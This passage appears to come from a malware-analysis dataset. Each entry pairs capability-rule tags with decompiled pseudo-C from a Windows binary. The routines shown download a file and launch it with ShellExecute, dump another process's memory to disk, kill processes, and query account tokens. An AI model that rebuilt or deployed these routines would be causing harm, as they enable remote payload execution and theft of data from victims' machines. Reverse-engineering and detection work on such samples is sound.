fcn.0040305c();\n                                uStackY96 = 0x480c01;\n                                fcn.00480860(&stack0xfffffffc);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        if (bVar1) {\n            fcn.00403918();\n            fcn.0040305c();\n        }\n        sub.wsock32.dll_shutdown();\n        sub.wsock32.dll_closesocket();\n        fcn.0041ff18();\n        iStack64 = iVar4;\n        puVar2 = puStack32;\n    }\ncode_r0x00480c3b:\n    puStack32 = puVar2;\n    *in_FS_OFFSET = iStack64;\n    fcn.00405554();\n    fcn.00405d40();\n    fcn.00405554();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1302
    },
    "00482b34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00482b34 noreturn (int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    var_4h = 0;\n    puStack44 = 0x482b53;\n    fcn.00405fe8();\n    uStack48 = 0x482c2e;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x482bf9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    fcn.00408560();\n    fcn.004055c8();\n    iVar1 = *(arg_8h + 4);\n    if (iVar1 <= *(arg_8h + 8)) {\n        iVar2 = (*(arg_8h + 8) - iVar1) + 1;\n        var_14h = iVar1;\n        do {\n            if (**0x494a74 == '\\0') {\n    // WARNING: Subroutine does not return\n                sub.kernel32.dll_ExitThread_1(0);\n            }\n            iVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 8);\n            fcn.00405584();\n            *(iVar1 + 4) = var_14h;\n            sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048298c, iVar1, 0, &fcn.00482b34::var_18h);\n            uStack64 = 100;\n            sub.kernel32.dll_Sleep_2();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 515
    },
    "00482e34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00482e34(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *in_FS_OFFSET;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar *puVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_24h = &stack0xfffffffc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x4830d3;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00482e34::var_20h;\n    if (*0x494788 != '\\x01') {\n        var_28h = 0x483087;\n        var_2ch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00482e34::var_2ch;\n        var_18h = &stack0xfffffffc;\n        var_14h = unaff_EDI;\n        var_10h = unaff_ESI;\n        fcn.00405530();\n        *0x494788 = 1;\n        *0x494784 = '\\0';\n        fcn.00473208();\n        fcn.0040ef44(&fcn.00482e34::var_24h, *0x4830e4);\n        fcn.004055c8();\n        fcn.00409b7c();\n        fcn.004055c8();\n        piVar1 = fcn.00404620();\n        (**(*piVar1 + 0x2c))();\n        do {\n            (**(*piVar1 + 0xc))();\n            (**(*piVar1 + 0x48))();\n            fcn.00405b28(&fcn.00482e34::var_10h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00482e34::var_14h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.00405b28(&fcn.00482e34::var_18h);\n            fcn.00405a44();\n            fcn.00405b28();\n            fcn.00405a84();\n            fcn.004055c8();\n            iVar2 = 0;\n            do {\n                uVar9 = 0x483104;\n                uVar7 = 0x483104;\n                uVar5 = 0x483104;\n                uVar4 = 0;\n                iVar3 = iVar2;\n                puVar6 = var_18h;\n                uVar8 = var_14h;\n                uVar10 = var_10h;\n                fcn.00409e5c(iVar2);\n                fcn.004058e0(var_2ch, iVar3, uVar4, uVar5, puVar6, uVar7, uVar8, uVar9, uVar10);\n                sub.kernel32.dll_CreateThread_1(0, 0, fcn.00482cdc, &fcn.00482e34::var_4h, 0, &fcn.00482e34::var_20h);\n                sub.kernel32.dll_Sleep_2();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0x100);\n            iVar2 = (**(*piVar1 + 0x14))();\n        } while (iVar2 != 0);\n        uVar8 = 0x483110;\n        fcn.004058e0(0x483110, var_18h, 0x483104, var_14h, 0x483104, var_10h);\n        while (*0x494784 == '\\0') {\n            uVar8 = 100;\n            sub.kernel32.dll_Sleep_2();\n        }\n        fcn.00405864();\n        fcn.00475e2c();\n        *in_FS_OFFSET = uVar8;\n        *in_FS_OFFSET = var_14h;\n        fcn.00405554(0x4830da);\n        fcn.00405554();\n        return;\n    }\n    var_24h = NULL;\n    // WARNING: Subroutine does not return\n    var_28h = 0x4830ab;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1189
    },
    "00483c10": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00483c10 noreturn (uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uVar6;\n    uint uVar7;\n    int32_t iStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    int32_t iStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    puStack84 = 0x483c38;\n    fcn.00405fe8();\n    uStack88 = 0x483e62;\n    iStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    var_20h = 0;\n    var_28h = 0;\n    var_2ch = 0;\n    uStack96 = 0x483c64;\n    puStack84 = &stack0xfffffffc;\n    fcn.00403af4();\n    var_30h = 0;\n    uStack96 = 0x483c71;\n    fcn.00405530();\n    uStack96 = 0x483c80;\n    fcn.00408560();\n    arg_8h_00 = *arg_8h;\n    uVar4 = arg_8h[1];\n    uVar1 = arg_8h[2];\n    uVar2 = arg_8h[3];\n    uStack96 = 0x483c9c;\n    fcn.004055c8();\n    if (uVar1 == uVar4) {\n        uStack96 = 0x483caf;\n        fcn.00475e2c();\n        uStack96 = 0;\n    // WARNING: Subroutine does not return\n        uStack100 = 0x483cb6;\n        sub.kernel32.dll_ExitThread_1();\n    }\n    uStack100 = 0;\n    uStack104 = 0x10;\n    puStack108 = 0x483cc3;\n    uStack96 = arg_8h_00;\n    var_24h = sub.kernel32.dll_OpenProcess();\n    if (var_24h != 0) {\n        uStack112 = 0x483e1c;\n        iStack116 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff8c;\n        puStack108 = &stack0xfffffffc;\n        iVar3 = fcn.004059dc(0x40000000, 0, 0, 4, 0, 0);\n        var_20h = sub.kernel32.dll_CreateFileA_1();\n        if (var_20h != -1) {\n            fcn.00406928(uVar2);\n            for (; uVar4 < uVar1; uVar4 = uVar4 + uVar5) {\n                uVar5 = uVar2;\n                if (uVar1 - uVar4 < uVar2) {\n                    uVar5 = uVar1 - uVar4;\n                }\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, 4, &fcn.00483c10::var_30h);\n                sub.kernel32.dll_ReadProcessMemory(var_24h, uVar4, var_4h, uVar5, &fcn.00483c10::var_28h);\n                sub.kernel32.dll_VirtualProtectEx(var_24h, uVar4, uVar5, var_30h, &fcn.00483c10::var_30h);\n                iVar3 = var_20h;\n                sub.kernel32.dll_WriteFile_1();\n            }\n            *in_FS_OFFSET = iVar3;\n            fcn.00406934(0x483e23);\n            sub.kernel32.dll_SetEndOfFile_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_20h);\n            sub.kernel32.dll_CloseHandle_1(var_24h);\n            uVar7 = 0x483f0c;\n            uVar6 = 0;\n            fcn.00409e5c(arg_8h_00);\n            fcn.004058e0(0x483f4c, var_8h, 0x483f2c, 0, arg_8h_00, uVar6, uVar7);\n            fcn.00475e2c();\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitThread_1(0);\n        }\n        fcn.00475e2c();\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread_1(0);\n    }\n    puStack108 = 0x483cd6;\n    fcn.00475e2c();\n    puStack108 = NULL;\n    // WARNING: Subroutine does not return\n    uStack112 = 0x483cdd;\n    sub.kernel32.dll_ExitThread_1();\n}\n",
        "token_count": 1241
    },
    "004840d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004840d8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    bool bVar4;\n    int32_t iStackY176;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x484275;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    var_5h = 0;\n    iVar1 = sub.kernel32.dll_OpenProcess(0x400, 0);\n    if (iVar1 != 0) {\n        iVar2 = sub.advapi32.dll_OpenProcessToken(iVar1, 8, &TokenHandle);\n        if (iVar2 != 0) {\n            uVar3 = TokenHandle;\n            iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 1, 0, 0, &TokenInformationLength);\n            TokenInformation = NULL;\n            while (bVar4 = iVar2 == 0,  bVar4) {\n                iVar2 = sub.kernel32.dll_GetLastError_1();\n                if (iVar2 != 0x7a) break;\n                fcn.00402f34();\n                uVar3 = TokenHandle;\n                iVar2 = sub.advapi32.dll_GetTokenInformation();\n            }\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, uVar3);\n            if (bVar4) goto code_r0x0048425a;\n            var_1ch = 0;\n            var_20h = 0;\n            sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, 0, &var_1ch, 0, &var_20h, &var_18h);\n            if ((var_1ch != 0) && (var_20h != 0)) {\n                fcn.00405c6c();\n                fcn.00405c6c();\n                uVar3 = fcn.004059dc(&var_20h, &var_18h);\n                uVar3 = fcn.004059dc(&var_1ch, uVar3);\n                iVar2 = sub.advapi32.dll_LookupAccountSidA(0, *TokenInformation, uVar3);\n                if (iVar2 != 0) {\n                    var_5h = 1;\n                    fcn.004059dc();\n                    fcn.0040aaa8();\n                    fcn.00405584();\n                    fcn.004059dc();\n                    fcn.0040aaa8();\n                    fcn.00405584();\n                }\n            }\n            if (!bVar4) {\n                fcn.00402f1c();\n            }\n        }\n        sub.kernel32.dll_CloseHandle_1();\n        iStackY176 = iVar1;\n    }\ncode_r0x0048425a:\n    *in_FS_OFFSET = iStackY176;\n    fcn.00405554(0x48427c);\n    return;\n}\n",
        "token_count": 742
    },
    "00484388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00484388(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iVar1;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t hProcess;\n    uint lpExitCode;\n    \n    uStack20 = 0;\n    uStack24 = 1;\n    puStack28 = 0x484398;\n    hProcess = sub.kernel32.dll_OpenProcess();\n    if (hProcess != 0) {\n        uStack32 = 0x4843e0;\n        iStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        sub.kernel32.dll_GetExitCodeProcess(hProcess, &fcn.00484388::lpExitCode);\n        iVar1 = hProcess;\n        sub.kernel32.dll_TerminateProcess(hProcess, lpExitCode);\n        *in_FS_OFFSET = iVar1;\n        sub.kernel32.dll_CloseHandle_1(hProcess, 0x4843e7);\n        return;\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "004843ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004843ec(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    int32_t iStack300;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint var_108h;\n    uint hObject;\n    \n    uStack280 = 0x484407;\n    fcn.00405584();\n    uStack284 = 0;\n    uStack288 = 0x1f0fff;\n    puStack292 = 0x484414;\n    iVar1 = sub.kernel32.dll_OpenProcess();\n    uStack296 = 0x48447b;\n    iStack300 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed4;\n    if (iVar1 == 0) {\n        puStack292 = &stack0xfffffffc;\n        fcn.00404f70();\n    }\n    else {\n        uVar3 = 0x104;\n        puStack292 = &stack0xfffffffc;\n        iVar2 = fcn.00461148(0x104);\n        if (iVar2 != 0) {\n            fcn.004057a0();\n            *in_FS_OFFSET = uVar3;\n            uStack296 = 0x484482;\n            iStack300 = iVar1;\n            sub.kernel32.dll_CloseHandle_1();\n            return;\n        }\n        fcn.00404f70();\n    }\n    return;\n}\n",
        "token_count": 335
    },
    "0048485c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048485c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    int64_t iVar4;\n    int32_t iStack1708;\n    uint uStack1704;\n    uchar *puStack1700;\n    int32_t iStack1696;\n    uint uStack1692;\n    uint *puStack1688;\n    uint *puStack1684;\n    uint *puStack1680;\n    int32_t iStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    uint uStack1664;\n    uint uStack1660;\n    uint uStack1656;\n    int32_t iStack1652;\n    uint uStack1648;\n    uchar *puStack1644;\n    uint uStack1640;\n    uint uStack1636;\n    uint uStack1632;\n    uint uStack1628;\n    uint uStack1624;\n    int32_t iStack1612;\n    uint uStack1608;\n    uchar *puStack1604;\n    uint var_634h;\n    uint var_630h;\n    uint var_62ch;\n    uint var_628h;\n    uint var_624h;\n    uint var_424h;\n    int32_t *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack1604 = 0x48488f;\n    fcn.004059cc();\n    puStack1604 = 0x484897;\n    fcn.004059cc();\n    uStack1608 = 0x484aff;\n    iStack1612 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff9b4;\n    var_9h = 0;\n    puStack1604 = &stack0xfffffffc;\n    fcn.00489afc();\n    fcn.0048550c();\n    fcn.004055c8();\n    var_24h = fcn.00404620();\n    fcn.0041beb4();\n    uStack1624 = 0x4848ff;\n    fcn.0041b734(0, 0);\n    uStack1624 = 0;\n    uStack1628 = 0;\n    uStack1632 = 0;\n    uStack1636 = 1;\n    uStack1640 = 0x484b14;\n    puStack1644 = 0x484911;\n    var_10h = sub.wininet.dll_InternetOpenA();\n    if (var_10h == 0) {\ncode_r0x00484ad4:\n        *in_FS_OFFSET = iStack1696;\n        puStack1688 = 0x484b06;\n        uStack1692 = 0x484af1;\n        fcn.00405554();\n        uStack1692 = 0x484afe;\n        fcn.00405554();\n        return;\n    }\n    uStack1648 = 0x484acd;\n    iStack1652 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff98c;\n    uStack1656 = 0;\n    uStack1660 = 0x4000000;\n    uStack1664 = 0;\n    uStack1668 = 0;\n    uStack1672 = 0x48493f;\n    puStack1644 = &stack0xfffffffc;\n    uStack1672 = fcn.004059dc();\n    iStack1676 = var_10h;\n    puStack1680 = 0x484949;\n    var_14h = sub.wininet.dll_InternetOpenUrlA();\n    if (var_14h == 0) {\n        puStack1680 = 0x484957;\n        fcn.00404f70();\n        goto code_r0x00484ad4;\n    }\n    var_18h = 0x200;\n    var_1ch = 0;\n    puStack1680 = &fcn.0048485c::var_1ch;\n    puStack1684 = &fcn.0048485c::var_18h;\n    puStack1688 = &fcn.0048485c::var_624h;\n    uStack1692 = 0x13;\n    puStack1700 = 0x484982;\n    iStack1696 = var_14h;\n    iVar1 = sub.wininet.dll_HttpQueryInfoA();\n    uVar3 = iVar1 == 0;\n    if (uVar3) {\n        puStack1700 = 0x48498b;\n        fcn.00404f70();\n        goto code_r0x00484ad4;\n    }\n    puStack1700 = 0x4849a6;\n    fcn.004057a0();\n    puStack1700 = 0x4849b7;\n    fcn.00409b7c();\n    puStack1700 = 0x4849c7;\n    fcn.00405974();\n    if (!uVar3) {\n        puStack1700 = 0x4849ce;\n        fcn.00404f70();\n        goto code_r0x00484ad4;\n    }\n    uStack1704 = 0x484a9b;\n    iStack1708 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff954;\n    puStack1700 = &stack0xfffffffc;\n    do {\n        fcn.00403af4();\n        iVar1 = sub.wininet.dll_InternetReadFile(var_14h, &fcn.0048485c::var_424h, 0x400, &fcn.0048485c::var_20h);\n        if ((iVar1 == 0) || (var_20h == 0)) break;\n        (**(*var_24h + 0x10))();\n    } while (var_20h != 0);\n    iVar1 = 0;\n    fcn.0041b734(0, 0);\n    iVar4 = (***var_24h)();\n    if (iVar4 >> 0x20 == 0) {\n        if (iVar4 == 0) goto code_r0x00484a7e;\n    }\n    else if (iVar4 < 0x100000000) goto code_r0x00484a7e;\n    fcn.0041be30();\n    if (arg_8h != '\\0') {\n        uVar2 = fcn.004059dc(0, 0, 5);\n        sub.shell32.dll_ShellExecuteA(0, 0x484b28, uVar2);\n    }\n    var_9h = 1;\ncode_r0x00484a7e:\n    *in_FS_OFFSET = iVar1;\n    if (var_14h != 0) {\n        sub.wininet.dll_InternetCloseHandle(var_14h, 0x484aa2);\n    }\n    return;\n}\n",
        "token_count": 1576
    },
    "00484b30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.00484b30(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint arg_8h;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_28h = &stack0xfffffffc;\n    var_ch = 7;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x484d9a;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00484b30::var_24h;\n    var_2ch = 0x484d6b;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00484b30::var_30h;\n    var_34h = 0x484b6d;\n    var_18h = unaff_EDI;\n    var_14h = in_EAX;\n    puVar3 = (**(**(in_EAX + 0x44) + 0x14))();\n    if (-1 < puVar3 + -1) {\n        var_18h = 0;\n        var_1ch = puVar3;\n        do {\n            var_38h = 0x484c82;\n            var_3ch = *in_FS_OFFSET;\n            *in_FS_OFFSET = &fcn.00484b30::var_3ch;\n            iVar1 = **(var_14h + 0x44);\n            var_34h = &stack0xfffffffc;\n            (**(iVar1 + 0xc))();\n            var_30h = &fcn.00484b30::var_4h;\n            var_34h = 0x484bb1;\n            fcn.00405b28();\n            var_34h = 0x484bc1;\n            fcn.00405a44();\n            var_34h = 0x484bce;\n            fcn.00405b28();\n            var_34h = 0x484bdd;\n            fcn.00405a84();\n            var_34h = &fcn.00484b30::var_8h;\n            var_38h = 0x484bee;\n            iVar4 = fcn.00405b28();\n            uVar5 = iVar4 == 1;\n            var_38h = 0x484bfe;\n            fcn.00405a44();\n            var_38h = 0x484c0b;\n            fcn.00405b28();\n            var_38h = 0x484c1a;\n            fcn.00405a84();\n            var_38h = 0x484c25;\n            fcn.004055c8();\n            var_38h = 0x484c32;\n            fcn.00405974();\n            if (uVar5) {\n                arg_8h = CONCAT31(iVar1 >> 8, 1);\n            }\n            else {\n                arg_8h = 0;\n            }\n            if (*(var_14h + 0x40) == 2) {\n                var_38h = 0x484c4c;\n                fcn.0048ce74();\n                var_38h = 0x484c5c;\n                fcn.00405864();\n                var_38h = 0x484c64;\n                fcn.00475e2c();\n            }\n            var_3ch = 0x484c76;\n            var_38h = arg_8h;\n            cVar2 = fcn.0048485c(arg_8h);\n            *in_FS_OFFSET = var_38h;\n            if (*(var_14h + 0x40) == 0) {\n                if (cVar2 == '\\0') {\n                    var_30h = 0x484cc6;\n                    fcn.00405864();\n                    var_30h = 0x484cce;\n                    fcn.00475e2c();\n                }\n                else {\n                    var_30h = 0x484cac;\n                    fcn.00405864();\n                    var_30h = 0x484cb4;\n                    fcn.00475e2c();\n                }\n            }\n            if (*(var_14h + 0x40) == 2) {\n                if (cVar2 == '\\0') {\n                    var_30h = 0x484d06;\n                    fcn.0048ce74();\n                    var_30h = 0x484d16;\n                    fcn.00405864();\n                    var_30h = 0x484d1e;\n                    fcn.00475e2c();\n                }\n                else {\n                    var_30h = 0x484ce4;\n                    fcn.0048ce74();\n                    var_30h = 0x484cf4;\n                    fcn.00405864();\n                    var_30h = 0x484cfc;\n                    fcn.00475e2c();\n                }\n            }\n            if ((*(var_14h + 0x40) == 3) && (cVar2 != '\\0')) {\n                var_30h = 0x484d33;\n                fcn.00475bd8();\n            }\n            var_30h = 0x7d0;\n            var_34h = 0x484d3d;\n            sub.kernel32.dll_Sleep_2();\n            var_18h = var_18h + 1;\n            var_1ch = var_1ch + -1;\n        } while (var_1ch != NULL);\n    }\n    *in_FS_OFFSET = var_30h;\n    var_28h = 0x484d72;\n    if (*(var_14h + 0x44) != 0) {\n        var_2ch = 0x484d6a;\n        fcn.0040f944();\n    }\n    return;\n}\n",
        "token_count": 1530
    },
    "00484ee8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00484eef)\n\nvoid __fastcall fcn.00484ee8(uint param_1, ushort param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (1 < *(in_EAX + 0x40)) {\n        *(in_EAX + 0x40) = 1;\n    }\n    *(in_EAX + 0x40) = param_2;\n    return;\n}\n",
        "token_count": 100
    },
    "00485eac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00485eac(void)\n\n{\n    uint uVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x485f28;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    puVar2 = &stack0xfffffffc;\n    if (*(in_EAX + 0x40) != 0) {\n        fcn.0040f944();\n        puVar2 = puStack20;\n    }\n    puStack20 = puVar2;\n    if (*(*0x49a398 + 0xec) != '\\0') {\n        fcn.00466724();\n    }\n    fcn.00466bdc();\n    fcn.0040f944();\n    fcn.0040f944();\n    sub.wsock32.dll_shutdown(*0x49c3a0, 2);\n    uVar1 = *0x49c3a0;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 274
    },
    "00486094": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00486094(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint *puStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_2eh;\n    uint16_t var_10h;\n    int32_t var_eh;\n    int32_t var_ah;\n    int16_t var_6h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x4861fe;\n    puStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack76;\n    fcn.00485eac();\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x40) = uVar2;\n    cVar1 = fcn.00485f40();\n    if (cVar1 != '\\0') {\n        var_eh = *(in_EAX + 0x44);\n        var_10h = *(in_EAX + 0x48);\n        var_4h._0_2_ = *(in_EAX + 0x4c);\n        var_ah = var_10h * var_eh * 2;\n        var_6h = var_10h * 2;\n        if (*0x49a398 == 0) {\n            *0x49a398 = fcn.004664d0();\n        }\n        if (*0x49a39c == 0) {\n            *0x49a39c = fcn.00466964();\n        }\n        iVar3 = *0x49a39c;\n        *(*0x49a39c + 0xa4) = *(in_EAX + 0x40);\n        *(iVar3 + 0xa0) = fcn.00486210;\n        *(*0x49a398 + 0x15e) = var_10h;\n        *(*0x49a398 + 0x160) = var_eh;\n        *(*0x49a398 + 0x164) = var_ah;\n        *(*0x49a398 + 0x168) = var_6h;\n        *(*0x49a398 + 0x16a) = var_4h;\n        fcn.00466740();\n        fcn.00466c34();\n        fcn.00466724();\n        fcn.00466afc();\n        while (*(in_EAX + 0xd) == '\\0') {\n            while( true ) {\n                puStack76 = &var_2eh;\n                iVar3 = sub.user32.dll_PeekMessageA();\n                if (iVar3 == 0) break;\n                sub.user32.dll_TranslateMessage(&var_2eh);\n                puStack76 = &var_2eh;\n                sub.user32.dll_DispatchMessageA();\n            }\n        }\n    }\n    